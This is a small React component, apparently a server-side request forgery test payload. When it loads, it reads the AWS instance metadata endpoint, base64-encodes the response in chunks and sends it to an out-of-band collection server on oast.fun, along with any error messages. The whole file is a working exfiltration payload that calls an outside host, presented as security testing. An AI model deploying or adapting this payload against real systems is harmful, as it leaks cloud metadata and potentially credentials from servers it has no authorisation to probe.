import React, { useEffect } from "react";

function Ssrf() {
  useEffect(() => {
    // Your OOB server and target URL (change these accordingly)
    const oobServer = "https://bjgibppjensgmxvguqwdtvjuqsby346yh.oast.fun";
    const targetUrl = "http://169.254.169.254/latest/meta-data/hostname";
    const timeoutDuration = 5000; // 5 seconds timeout

    // Function to split data into chunks and exfiltrate each chunk
    function exfiltrateData(data) {
      const chunkSize = 1500;
      for (let i = 0; i < data.length; i += chunkSize) {
        const chunk = data.slice(i, i + chunkSize);
        const encodedChunk = btoa(chunk);
        // Send each chunk with its offset as an index
        fetch(`${oobServer}/?x=${i}_${encodedChunk}`);
      }
    }

    // Function to fetch the URL and exfiltrate its response or error message
    function fetchAndExfiltrate(url, timeoutDuration) {
      const controller = new AbortController();
      const signal = controller.signal;
      const timeoutId = setTimeout(() => controller.abort(), timeoutDuration);

      fetch(url, { signal })
        .then(response => {
          clearTimeout(timeoutId);
          if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
          }
          return response.text();
        })
        .then(data => {
          exfiltrateData(data);
        })
        .catch(error => {
          // If there is an error, exfiltrate the error message
          fetch(`${oobServer}/?error=${btoa(error.message)}`);
        });
    }

    // Execute the function
    fetchAndExfiltrate(targetUrl, timeoutDuration);
  }, []);

  return (
    <div>
      <div>
        <div>
          <h1>SSRF</h1>
          <h2>TSSRF for testing</h2>
        </div>
      </div>
    </div>
  );
}

export default Ssrf;
